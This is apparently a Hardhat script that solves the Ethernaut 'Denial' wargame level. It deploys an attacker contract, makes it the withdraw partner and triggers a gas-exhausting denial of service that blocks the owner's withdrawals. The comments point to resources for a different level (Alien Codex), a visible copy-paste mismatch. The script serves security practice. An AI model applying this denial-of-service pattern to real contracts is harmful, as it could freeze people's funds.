/*
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
*/

// Main resource used to figure out the solution of this level: 
  // https://github.com/CeTesDev/EthernautLevels/tree/main/alien-codex
  // https://blog.dixitaditya.com/ethernaut-level-19-alien-codex
  // https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html#mappings-and-dynamic-arrays

const { ethers } = require("ethers");
const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await hre.ethers.getSigners();

  // Get an instance of the AlienCodex contract deployed by Ethernaut
  const DenialAddress = "0x7B496fF92297404883C1DF3724De116B6BD534C3"
  this.denial = await hre.ethers.getContractAt("Denial",DenialAddress);

  console.log("Getting the initial values set on the Denial contract");

  console.log(
    `
    Denial Balance ${await hre.ethers.provider.getBalance(this.denial.address)} \n
    Partner ${await this.denial.partner()}
    `
  );


  console.log("Deploying the Attacker contract...");

  // Deploy the attacker contract
  const AttackDenial = await hre.ethers.getContractFactory("AttackDenial");
  this.attackDenialContract = await AttackDenial.connect(player).deploy(this.denial.address);
  await this.attackDenialContract.deployed();

  console.log("Attack Denial Contract address: ", this.attackDenialContract.address);
  console.log("\n Executing the attack! \n");

  // Making the Attacker contract a partner in the Denial contract
  const partnerTx = await this.attackDenialContract.setWithdrawPartner();
  // Await for the tx to be mined
  await partnerTx.wait();


  // Calling the function that performs the attack
  const attackTX = await this.attackDenialContract.connect(player).initiateAttack({ gasLimit: 1250000 }); //1.25 million gas
  // Await for the attackTX to be mined
  console.log("Waiting while the DoS is executed");
  await attackTX.wait();

  console.log("\n===============================================\n Results after the attack \n ===============================================\n");
  
  console.log(
    `
    Denial Balance ${await hre.ethers.provider.getBalance(this.denial.address)} \n
    Partner ${await this.denial.partner()}
    `
  );

 
  console.log("Everything is ready to Submit the level instance!");
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});